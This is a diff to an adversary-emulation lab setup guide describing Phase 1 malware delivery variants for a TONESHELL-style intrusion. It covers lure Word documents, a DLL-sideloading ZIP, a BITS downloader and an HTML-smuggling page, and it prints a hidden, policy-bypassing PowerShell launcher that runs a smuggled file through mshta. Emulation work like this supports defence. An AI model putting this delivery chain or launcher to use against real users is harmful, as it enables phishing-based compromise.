@@ -76,6 +76,18 @@ ss -tlnp | grep 8443
 
 ### Adversary Staging Web Server
 
+Phase 1 delivery variants are served by two servers. Which one must be running depends on the variant under test:
+
+| Step (variant) | Server | Port / URL | File actually served | Lure doc staged on WS01 |
+| - | - | - | - | - |
+| Step 1 (browser download) | `simplefileserver` handler inside controlServer | TCP 80 — `http://192.168.56.2/files/` | `250325_Pentos_Board_Minutes.zip` | `Braavos_Competitiveness_Brief.docx` → link to `/files/...zip` |
+| Step 1B (BITS download) | standalone `server.py` (shared, see below) | TCP 8080 | `250325_Pentos_Board_Minutes.zip` (Range-capable copy) | same `Braavos_Competitiveness_Brief.docx` + `BitsDownloader.exe` |
+| Step 1C (HTML smuggling) | standalone `server.py` (shared, see below) | TCP 8080 | `staging.html` (smuggles a polyglot `.txt`; neither the `.txt` nor the `.hta` is ever served) | `Essos_Compliance_Update.docx` → link to `:8080/staging.html` |
+
+Steps 1B and 1C share the same `server.py` instance on TCP 8080; Step 1 always uses the controlServer handler on TCP 80. Both can run side by side.
+
+#### Step 1 — `simplefileserver` (controlServer handler)
+
 The `simplefileserver` handler in controlServer serves the delivery package — no separate process needed. It starts automatically with controlServer and serves files from `../toneshell-v2/` at prefix `/files` on TCP 80.
 
 The handler serves the whole `toneshell-v2/` tree, so stage the delivery ZIP at its root — the build artifact lives under `build/src/wsdapi/Release/` (from the repo root):
@@ -93,7 +105,7 @@ Invoke-WebRequest -Uri "http://192.168.56.2/files/250325_Pentos_Board_Minutes.zi
 # Expected: StatusCode 200
 ```
 
-#### Shared staging server for the download variants (Step 1B + Step 1C)
+#### Steps 1B + 1C — shared `server.py` (TCP 8080)
 
 Step 1 (main) keeps using the controlServer `simplefileserver` handler (TCP 80, `/files`) — unchanged. The two download variants instead share **one** standalone `server.py` instance on TCP 8080, serving a single common directory — `/media/sf_share` — that must hold both files they need:
 
@@ -146,20 +158,30 @@ $page.StatusCode               # Expected: 200
 
 Confirm the following files are prepared and in place:
 
-**On attacker host** — served via the staging web servers:
-- `250325_Pentos_Board_Minutes.zip` — password-protected ZIP (`Pentos`) containing:
+**On attacker host — served by `simplefileserver` (TCP 80, `/files`), used by Step 1 only:**
+- `250325_Pentos_Board_Minutes.zip` — password-protected ZIP (`Pentos`) staged at the root of `toneshell-v2/` containing:
   - `Essos Competitiveness Brief.lnk` — icon spoofed to `shell32.dll,70`
   - `EssosUpdate.exe` — renamed `wsddebug_host.exe` (signed Microsoft binary)
   - `wsdapi.dll` — attacker-controlled sideload DLL (Tully Enterprises self-signed cert)
-- `staging.html` — HTML smuggling lure page (**Step 1C**); copy into the shared staging directory `/media/sf_share` served by `server.py` (see above), which also holds the ZIP for Step 1B
+
+**On attacker host — served by `server.py` (TCP 8080, `/media/sf_share`), used by Steps 1B + 1C:**
+- `250325_Pentos_Board_Minutes.zip` — second copy of the same ZIP, downloaded by the Step 1B BITS job (server must advertise `Accept-Ranges` or BITS will not transfer)
+- `staging.html` — HTML smuggling lure page (Step 1C); embeds a base64 blob the browser reassembles into a polyglot `Essos_Compliance_Update.txt` (PEM header + base64 of `stage1.hta`); the `.hta` is then built locally by the Win+R PowerShell launcher — **no `.txt` or `.hta` file is ever hosted**
 
 **On WS01** — staged by operator via RDP before running Phase 1:
-- `C:\Users\labuser\Desktop\Braavos_Competitiveness_Brief.docx` — Word lure document with embedded hyperlink pointing to `http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip`
+- `C:\Users\labuser\Desktop\Braavos_Competitiveness_Brief.docx` — Word lure document for **Steps 1 / 1B** with embedded hyperlink pointing to `http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip` (source template: `resources/payloads/toneshell_spearphishing.docx`)
+- `C:\Users\labuser\Desktop\Essos_Compliance_Update.docx` — Word lure document for **Step 1C only**; same lure template with the embedded hyperlink re-pointed to `http://192.168.56.2:8080/staging.html`
 - `C:\Users\labuser\Downloads\BitsDownloader.exe` — unsigned C# BITS downloader, used only by the **Step 1B variant** (BITS-based delivery); staged by operator via RDP
 
 > **BITS variant (Step 1B):** requires the Range-capable `server.py` started above. Build `BitsDownloader.exe` via [`../resources/payloads/file-servers/http-client/csharp-downloader/build.bat`](../resources/payloads/file-servers/http-client/csharp-downloader/build.bat) if missing.
 >
-> **HTML smuggling variant (Step 1C):** uses a lure document whose embedded hyperlink points to `http://192.168.56.2:8080/staging.html` instead of the ZIP. Rebuild `staging.html` with [`../resources/payloads/user-trigger/html-smuggling-hta/build.py`](../resources/payloads/user-trigger/html-smuggling-hta/build.py) after changing the loader, then re-copy it into `/media/sf_share`.
+> **HTML smuggling variant (Step 1C):** uses `Essos_Compliance_Update.docx` whose embedded hyperlink points to `http://192.168.56.2:8080/staging.html` instead of the ZIP. The page smuggles `Essos_Compliance_Update.txt` into `Downloads\` and pre-loads the launcher into the clipboard; the operator then runs it (**Win+R → Ctrl+V → Enter**):
+>
+> ```text
+> powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\Essos_Compliance_Update.txt')"
+> ```
+>
+> PowerShell decodes the polyglot `.txt` into `%TEMP%\Essos_Compliance_Update.hta` and hands it to `mshta.exe`. Rebuild `staging.html` with [`../resources/payloads/user-trigger/html-smuggling-hta/build.py`](../resources/payloads/user-trigger/html-smuggling-hta/build.py) after changing the loader, then re-copy it into `/media/sf_share`.
 
 If the package needs to be rebuilt, see:
 [`../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/README.md`](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/README.md)
@@ -191,6 +213,7 @@ Test-NetConnection -ComputerName 192.168.56.2 -Port 8443
 
 - Logged-in user: `TESTLAB\labuser` (RDP or console)
 - `Braavos_Competitiveness_Brief.docx` staged to `C:\Users\labuser\Desktop\` by operator via RDP before running Phase 1
+- `Essos_Compliance_Update.docx` staged to `C:\Users\labuser\Desktop\` for the Step 1C variant (hyperlink → `http://192.168.56.2:8080/staging.html`)
 - Credential artifact seeded: `C:\Users\labuser\Documents\DevPortal\appsettings.json` (see [Windows Server 2022-MSSQL.md](../resources/setup/Windows%20Server%202022-MSSQL.md) Step 6)
 - Optional: SSMS 20 installed with `svc_app_dev` saved connection in Credential Manager
 
